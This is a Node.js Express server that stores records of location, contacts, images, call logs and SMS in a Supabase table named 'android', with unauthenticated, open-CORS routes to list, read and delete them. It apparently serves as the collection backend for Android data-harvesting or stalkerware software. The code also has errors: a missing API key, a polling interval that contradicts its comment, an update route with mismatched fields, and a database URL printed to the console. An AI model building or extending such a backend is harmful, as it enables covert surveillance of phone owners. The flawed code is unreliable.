import express from 'express';
import { createClient } from '@supabase/supabase-js';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Supabase client initialization with PostgreSQL connection
const supabase = createClient(
  process.env.DATABASE_URL,
  {
    db: {
      schema: 'public'
    }
  }
);

// Database connection status endpoint
app.get('/api/status', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('android')
      .select('count')
      .limit(1);
    
    if (error) throw error;
    
    res.json({ 
      status: 'connected',
      message: 'Database connection is active',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Database connection error:', error);
    res.status(500).json({ 
      status: 'disconnected',
      message: 'Database connection error',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Routes
app.get('/api/items', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('android')
      .select('*');
    
    if (error) throw error;
    res.json(data);
  } catch (error) {
    console.error('Error fetching items:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/items', async (req, res) => {
  try {
    const { location, contacts, image, call_logs, sms } = req.body;
    const { data, error } = await supabase
      .from('android')
      .insert([
        { location, contacts, image, call_logs, sms }
      ])
      .select()
      .single();
    
    if (error) throw error;
    res.status(201).json(data);
  } catch (error) {
    console.error('Error creating item:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/items/:id', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('android')
      .select('*')
      .eq('id', req.params.id)
      .single();
    
    if (error) throw error;
    if (!data) {
      return res.status(404).json({ error: 'Item not found' });
    }
    
    res.json(data);
  } catch (error) {
    console.error('Error fetching item:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/items/:id', async (req, res) => {
  try {
    const { name, description } = req.body;
    const { data, error } = await supabase
      .from('android')
      .update({ name, description })
      .eq('id', req.params.id)
      .select()
      .single();
    
    if (error) throw error;
    if (!data) {
      return res.status(404).json({ error: 'Item not found' });
    }
    
    res.json(data);
  } catch (error) {
    console.error('Error updating item:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/items/:id', async (req, res) => {
  try {
    const { error } = await supabase
      .from('android')
      .delete()
      .eq('id', req.params.id);
    
    if (error) throw error;
    res.status(204).send();
  } catch (error) {
    console.error('Error deleting item:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Connection status monitoring
let isConnected = false;
let connectionAttempts = 0;
const MAX_RETRY_ATTEMPTS = 5;

const checkConnection = async () => {
  try {
    const startTime = Date.now();
    const { error } = await supabase
      .from('android')
      .select('count')
      .limit(1);
    
    const responseTime = Date.now() - startTime;
    
    if (error) throw error;
    
    if (!isConnected) {
      console.clear();
      console.log('\n=== Database Connection Status ===');
      console.log('✅ Connection established successfully');
      console.log(`📡 Response time: ${responseTime}ms`);
      console.log(`🏢 Database URL: ${process.env.DATABASE_URL}`);
      console.log('===============================\n');
      isConnected = true;
      connectionAttempts = 0;
    }
  } catch (error) {
    connectionAttempts++;
    console.clear();
    console.log('\n=== Database Connection Status ===');
    console.log('❌ Connection failed');
    console.log(`⚠️  Error: ${error.message}`);
    console.log(`🔄 Attempt: ${connectionAttempts}/${MAX_RETRY_ATTEMPTS}`);
    console.log('===============================\n');
    
    if (isConnected) {
      isConnected = false;
    }
    
    if (connectionAttempts >= MAX_RETRY_ATTEMPTS) {
      console.log('❌ Maximum retry attempts reached. Please check your database configuration.');
      process.exit(1);
    }
  }
};

// Check connection every 5 seconds
setInterval(checkConnection, 100000);

// Initial connection check
checkConnection();

// Start server
app.listen(port, () => {
  console.log(`\n🚀 Server running at http://localhost:${port}`);
});